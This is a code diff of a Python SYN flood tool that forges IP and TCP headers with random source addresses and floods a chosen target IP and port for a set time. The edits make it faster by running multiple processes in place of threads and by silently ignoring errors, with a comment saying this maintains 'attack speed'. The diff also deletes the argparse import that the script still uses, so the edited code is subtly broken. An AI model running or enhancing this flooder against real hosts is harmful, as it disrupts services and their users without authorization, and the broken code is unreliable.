@@ -1,11 +1,10 @@
 import socket
 import random
 import time
-import argparse
 import struct
 import threading
+import multiprocessing
 
-# Fungsi untuk membuat header IP
 def create_ip_header(src_ip, dest_ip):
     ip_ihl = 5
     ip_ver = 4
@@ -32,7 +31,6 @@ def create_ip_header(src_ip, dest_ip):
                             ip_dest)
     return ip_header
 
-# Fungsi untuk membuat header TCP
 def create_tcp_header(src_port, dest_port):
     tcp_seq = 0
     tcp_ack_seq = 0
@@ -54,7 +52,6 @@ def create_tcp_header(src_port, dest_port):
                              tcp_urg_ptr)
     return tcp_header
 
-# Fungsi untuk melakukan SYN Flooding dengan threading
 def syn_flood(target_ip, target_port, duration):
     end_time = time.time() + duration
     while time.time() < end_time:
@@ -70,30 +67,27 @@ def syn_flood(target_ip, target_port, duration):
 
             packet = ip_header + tcp_header
             sock.sendto(packet, (target_ip, 0))
-            print(f"Sent SYN packet from {src_ip}:{src_port} to {target_ip}:{target_port}")
-
         except Exception as e:
-            print(f"Error sending packet: {e}")
+            pass  # Ignore errors to maintain attack speed
 
-# Fungsi untuk menjalankan beberapa thread
-def start_attack(target_ip, target_port, duration, num_threads):
-    threads = []
-    for _ in range(num_threads):
-        t = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration))
-        t.start()
-        threads.append(t)
+def start_attack(target_ip, target_port, duration, num_processes):
+    processes = []
+    for _ in range(num_processes):
+        p = multiprocessing.Process(target=syn_flood, args=(target_ip, target_port, duration))
+        p.start()
+        processes.append(p)
 
-    for t in threads:
-        t.join()
+    for p in processes:
+        p.join()
 
 def parse_args():
     parser = argparse.ArgumentParser(description="Perform SYN Flood on a target IP.")
     parser.add_argument('ip', type=str, help="Target IP address")
     parser.add_argument('port', type=int, help="Target port number")
     parser.add_argument('duration', type=int, help="Duration of the attack in seconds")
-    parser.add_argument('--threads', type=int, default=10, help="Number of threads (default: 10)")
+    parser.add_argument('--processes', type=int, default=10, help="Number of processes (default: 10)")
     return parser.parse_args()
 
 if __name__ == "__main__":
     args = parse_args()
-    start_attack(args.ip, args.port, args.duration, args.threads)
+    start_attack(args.ip, args.port, args.duration, args.processes)
